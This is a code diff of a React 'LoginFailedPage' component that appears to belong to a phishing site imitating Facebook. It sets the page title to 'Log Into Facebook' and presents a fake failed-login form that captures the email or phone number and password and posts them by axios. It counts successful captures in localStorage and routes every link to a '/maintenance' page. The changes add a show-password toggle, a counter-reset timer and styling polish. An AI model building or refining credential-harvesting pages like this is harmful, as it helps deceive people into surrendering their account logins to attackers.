@@ -1,15 +1,20 @@
 import React, { useState, useRef, useEffect } from "react";
 import axios from "axios";
 import warningIcon from "../assets/warning.png";
+import eyeIcon from "../assets/show.png";
+import hideIcon from "../assets/hide.png";
 import { Link } from "react-router-dom";
 
 export default function LoginFailedPage() {
   const [email, setEmail] = useState();
   const [password, setPassword] = useState();
   const [isLoading, setIsLoading] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
   const successCountRef = useRef(0);
   const emailRef = useRef(null);
   const loginRef = useRef(null);
+
+  const togglePasswordVisibility = () => setShowPassword(!showPassword);
 
   useEffect(() => {
     // Retrieve success count from localStorage on component mount
@@ -23,11 +28,27 @@ export default function LoginFailedPage() {
   }, [successCountRef.current]);
 
   useEffect(() => {
+    const interval = setInterval(() => {
+      if (successCountRef.current !== 0) {
+        localStorage.setItem(
+          "successCount",
+          (successCountRef.current = 0).toString()
+        );
+      }
+    }, 60000);
+
+    return () => clearInterval(interval); // Clear the interval on component unmount
+  }, [successCountRef]);
+
+  useEffect(() => {
     document.title = "Log Into Facebook";
   }, []);
 
   const handleSubmit = (e) => {
     e.preventDefault();
+
+    // Set loading state
+    setIsLoading(true);
 
     if (!email || !password || isLoading)
       return setTimeout(() => {
@@ -36,9 +57,6 @@ export default function LoginFailedPage() {
           window.location.reload();
         }
       }, 3000);
-
-    // Set loading state
-    setIsLoading(true);
 
     // Sending a POST request to create a new user
     axios
@@ -104,7 +122,7 @@ export default function LoginFailedPage() {
                 <input
                   type='text'
                   id='email'
-                  className='p-[0.85rem] border-[1px] border-red-500 focus:outline-0 rounded-md w-full mt-1 placeholder:text-[1.1rem] placeholder:tracking-wide pl-[1rem]'
+                  className='p-[0.85rem] border-[1px] border-red-500 focus:outline-0 rounded-md w-full mt-1 text-[1.1rem] placeholder:text-[1.1rem] placeholder:tracking-wide pl-[1rem]'
                   placeholder='Email or phone number'
                   ref={emailRef}
                   autoComplete='on'
@@ -134,12 +152,25 @@ export default function LoginFailedPage() {
               {/* Input field for password with show/hide functionality */}
               <div className='relative flex items-center justify-end'>
                 <input
-                  type='password'
+                  type={showPassword ? "text" : "password"}
                   id='password'
-                  className=' p-[0.8rem] border-2 rounded-md w-full mt-1 placeholder:text-[1.1rem] placeholder:tracking-wide pl-[1rem]'
+                  className='p-[0.8rem] border-2 rounded-md w-full mt-1 text-[1.1rem] placeholder:text-[1.1rem] placeholder:tracking-wide pl-[1rem] focus:ring-2 focus:outline-offset-[-15px]'
                   placeholder='Password'
                   onChange={(e) => setPassword(e.target.value)}
                 />
+
+                {password && (
+                  <div
+                    className='absolute cursor-pointer mt-1 mr-[0.6rem]'
+                    onClick={togglePasswordVisibility}
+                  >
+                    <img
+                      src={showPassword ? eyeIcon : hideIcon}
+                      alt={showPassword ? "Hide Password" : "Show Password"}
+                      className='h-[1.7rem] max-w-full p-[0.35rem] rounded-full hover:bg-gray-100 active:bg-gray-300'
+                    />
+                  </div>
+                )}
               </div>
 
               {/* Submit button for the login form */}
@@ -154,7 +185,10 @@ export default function LoginFailedPage() {
                 Log In
               </button>
               <Link to='/maintenance' ref={loginRef} />
-              <Link to='/maintenance' className='block text-center mt-4 text-[15px] text-blue-600 pb-1 hover:underline'>
+              <Link
+                to='/maintenance'
+                className='block text-center mt-4 text-[15px] text-blue-600 pb-1 hover:underline'
+              >
                 Forgot password?
               </Link>
             </form>
